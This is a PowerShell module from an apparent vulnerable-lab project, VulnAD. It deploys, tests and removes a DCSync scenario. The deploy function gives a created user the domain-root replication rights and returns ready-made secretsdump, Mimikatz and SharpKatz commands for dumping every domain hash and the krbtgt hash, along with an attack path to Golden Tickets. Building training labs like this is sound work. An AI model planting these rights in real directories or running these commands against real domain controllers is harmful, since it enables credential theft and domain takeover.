#Requires -Modules ActiveDirectory

<#
.SYNOPSIS
    Deploys, removes, and tests DCSync privilege scenarios for VulnAD.

.DESCRIPTION
    This module grants DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
    extended rights to a standard domain user, enabling the DCSync attack. Attackers
    can use tools like Mimikatz or Impacket secretsdump to replicate password hashes
    from domain controllers without needing to run code on a DC.

    MITRE ATT&CK: T1003.006 - OS Credential Dumping: DCSync

.NOTES
    Module:     VulnAD
    Component:  DCSync Privilege Abuse
    Author:     VulnAD Project
#>

function Deploy-DCSync {
    <#
    .SYNOPSIS
        Deploys DCSync privilege misconfiguration.
    .DESCRIPTION
        Creates a user with DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
        extended rights on the domain root, enabling the DCSync attack.
    .PARAMETER Difficulty
        Scenario difficulty: Easy, Medium, or Hard.
    .PARAMETER DomainDN
        The distinguished name of the domain (e.g., DC=contoso,DC=com).
    .PARAMETER Domain
        The FQDN of the domain (e.g., contoso.com).
    .EXAMPLE
        Deploy-DCSync -Difficulty Hard -DomainDN 'DC=lab,DC=local' -Domain 'lab.local'
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('Easy', 'Medium', 'Hard')]
        [string]$Difficulty,

        [Parameter(Mandatory)]
        [string]$DomainDN,

        [Parameter(Mandatory)]
        [string]$Domain
    )

    begin {
        $scenarioName = 'DCSync Privilege'
        Write-VulnStatus -Message "Deploying $scenarioName scenario ($Difficulty)..." -Type Info
        $createdObjects = [System.Collections.Generic.List[string]]::new()

        # Replication right GUIDs
        $guidGetChanges    = [System.Guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
        $guidGetChangesAll = [System.Guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
    }

    process {
        try {
            # ---------------------------------------------------------------
            # 1. Create User
            # ---------------------------------------------------------------
            $pw1 = Get-VulnPassword -Difficulty $Difficulty -Index 0

            $user = New-VulnUser -SamAccountName 'r.thompson' `
                                 -Name 'Richard Thompson' `
                                 -Password $pw1 `
                                 -DomainDN $DomainDN `
                                 -Description 'Senior IT Infrastructure Engineer'
            $createdObjects.Add("CN=Richard Thompson,OU=Users,OU=ADMonolith,$DomainDN")

            Write-VulnResult -Name 'r.thompson' -Detail 'Senior IT Infrastructure Engineer created' -Success $true

            # ---------------------------------------------------------------
            # 2. Grant DCSync rights on the domain root
            # ---------------------------------------------------------------
            try {
                $userObj = Get-ADUser -Identity 'r.thompson' -ErrorAction Stop
                $userSID = $userObj.SID
                $identity = [System.Security.Principal.SecurityIdentifier]$userSID

                $domainPath = "AD:\$DomainDN"
                $acl = Get-Acl -Path $domainPath -ErrorAction Stop

                # DS-Replication-Get-Changes
                $aceGetChanges = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $identity,
                    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
                    [System.Security.AccessControl.AccessControlType]::Allow,
                    $guidGetChanges
                )
                $acl.AddAccessRule($aceGetChanges)

                # DS-Replication-Get-Changes-All
                $aceGetChangesAll = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $identity,
                    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
                    [System.Security.AccessControl.AccessControlType]::Allow,
                    $guidGetChangesAll
                )
                $acl.AddAccessRule($aceGetChangesAll)

                Set-Acl -Path $domainPath -AclObject $acl -ErrorAction Stop

                Write-VulnResult -Name 'DS-Replication-Get-Changes' `
                                 -Detail "Granted to r.thompson on $DomainDN" `
                                 -Success $true
                Write-VulnResult -Name 'DS-Replication-Get-Changes-All' `
                                 -Detail "Granted to r.thompson on $DomainDN" `
                                 -Success $true
            }
            catch {
                Write-VulnStatus -Message "Failed to set replication ACEs: $_" -Type Error
                Write-VulnResult -Name 'DCSync ACLs' -Detail "ACL configuration failed: $($_.Exception.Message)" -Success $false
                throw
            }

            Write-VulnResult -Name $scenarioName -Detail 'Deployment complete' -Success $true -IsLast

            # ---------------------------------------------------------------
            # 3. Build result object
            # ---------------------------------------------------------------
            $result = @{
                Scenario       = $scenarioName
                Description    = @(
                    "Richard Thompson (r.thompson) has been granted DS-Replication-Get-Changes and"
                    "DS-Replication-Get-Changes-All extended rights on the domain root ($DomainDN)."
                    "These two rights together allow the user to perform a DCSync attack, replicating"
                    "all password hashes from any domain controller without executing code on the DC."
                ) -join ' '
                CreatedObjects = $createdObjects.ToArray()
                AttackCommands = @(
                    "# Impacket secretsdump — Dump all domain hashes via DCSync"
                    "secretsdump.py '$Domain/r.thompson:$pw1'@<DC_IP> -just-dc"
                    ""
                    "# Impacket secretsdump — Target specific user (e.g., krbtgt)"
                    "secretsdump.py '$Domain/r.thompson:$pw1'@<DC_IP> -just-dc-user krbtgt"
                    ""
                    "# Mimikatz — DCSync for krbtgt hash"
                    "lsadump::dcsync /domain:$Domain /user:krbtgt"
                    ""
                    "# Mimikatz — DCSync for all users"
                    "lsadump::dcsync /domain:$Domain /all /csv"
                    ""
                    "# SharpKatz — DCSync"
                    "SharpKatz.exe --Command dcsync --User krbtgt --Domain $Domain --DomainController <DC_FQDN>"
                )
                AttackPath     = @(
                    '1. Enumerate users with replication rights via BloodHound or PowerView.'
                    '2. Compromise r.thompson credentials (password spraying, phishing, etc.).'
                    '3. Execute DCSync with secretsdump.py or Mimikatz to dump password hashes.'
                    '4. Crack NTLM hashes offline or perform pass-the-hash attacks.'
                    '5. Use the krbtgt hash to forge Golden Tickets for domain persistence.'
                )
                MitreID        = 'T1003.006'
                Difficulty     = $Difficulty
            }

            return $result
        }
        catch {
            Write-VulnStatus -Message "Failed to deploy $scenarioName scenario: $_" -Type Error
            throw
        }
    }
}

function Remove-DCSync {
    <#
    .SYNOPSIS
        Removes all objects created by Deploy-DCSync.
    .PARAMETER DomainDN
        The distinguished name of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$DomainDN
    )

    Write-VulnStatus -Message 'Removing DCSync Privilege scenario...' -Type Info

    # Remove replication ACEs from domain root
    $guidGetChanges    = [System.Guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
    $guidGetChangesAll = [System.Guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'

    try {
        $userObj = Get-ADUser -Identity 'r.thompson' -ErrorAction Stop
        $userSID = $userObj.SID

        $domainPath = "AD:\$DomainDN"
        $acl = Get-Acl -Path $domainPath -ErrorAction Stop

        $rulesToRemove = $acl.Access | Where-Object {
            $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $userSID -and
            $_.ObjectType -in @($guidGetChanges, $guidGetChangesAll)
        }

        foreach ($rule in $rulesToRemove) {
            $acl.RemoveAccessRule($rule) | Out-Null
        }

        Set-Acl -Path $domainPath -AclObject $acl -ErrorAction Stop
        Write-VulnResult -Name 'DCSync ACLs' -Detail 'Replication rights removed from domain root' -Success $true
    }
    catch {
        Write-VulnResult -Name 'DCSync ACLs' -Detail "ACL cleanup failed: $_" -Success $false
    }

    # Remove user
    try {
        Remove-ADUser -Identity 'r.thompson' -Confirm:$false -ErrorAction Stop
        Write-VulnResult -Name 'r.thompson' -Detail 'User removed' -Success $true
    }
    catch {
        Write-VulnResult -Name 'r.thompson' -Detail "Removal failed: $_" -Success $false
    }

    Write-VulnResult -Name 'DCSync Privilege' -Detail 'Cleanup complete' -Success $true -IsLast
}

function Test-DCSync {
    <#
    .SYNOPSIS
        Validates that the DCSync privilege scenario is correctly deployed.
    .PARAMETER DomainDN
        The distinguished name of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$DomainDN
    )

    $results = @{}

    $guidGetChanges    = [System.Guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
    $guidGetChangesAll = [System.Guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'

    # Check user exists
    try {
        $userObj = Get-ADUser -Identity 'r.thompson' -ErrorAction Stop
        $results['r.thompson'] = $true
    }
    catch {
        $results['r.thompson'] = $false
    }

    # Check replication rights on domain root
    if ($results['r.thompson']) {
        try {
            $userSID = $userObj.SID
            $acl = Get-Acl -Path "AD:\$DomainDN" -ErrorAction Stop

            $replicationAces = $acl.Access | Where-Object {
                try {
                    $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $userSID
                }
                catch { $false }
            }

            $hasGetChanges = $replicationAces | Where-Object { $_.ObjectType -eq $guidGetChanges }
            $hasGetChangesAll = $replicationAces | Where-Object { $_.ObjectType -eq $guidGetChangesAll }

            $results['DS-Replication-Get-Changes'] = ($null -ne $hasGetChanges)
            $results['DS-Replication-Get-Changes-All'] = ($null -ne $hasGetChangesAll)
        }
        catch {
            $results['DS-Replication-Get-Changes'] = $false
            $results['DS-Replication-Get-Changes-All'] = $false
        }
    }
    else {
        $results['DS-Replication-Get-Changes'] = $false
        $results['DS-Replication-Get-Changes-All'] = $false
    }

    $allPassed = $results.Values -notcontains $false

    foreach ($key in $results.Keys) {
        $isLast = ($key -eq ($results.Keys | Select-Object -Last 1))
        Write-VulnResult -Name $key -Detail $(if ($results[$key]) { 'Validated' } else { 'Missing' }) `
                         -Success $results[$key] -IsLast:$isLast
    }

    return $allPassed
}

Export-ModuleMember -Function Deploy-DCSync, Remove-DCSync, Test-DCSync

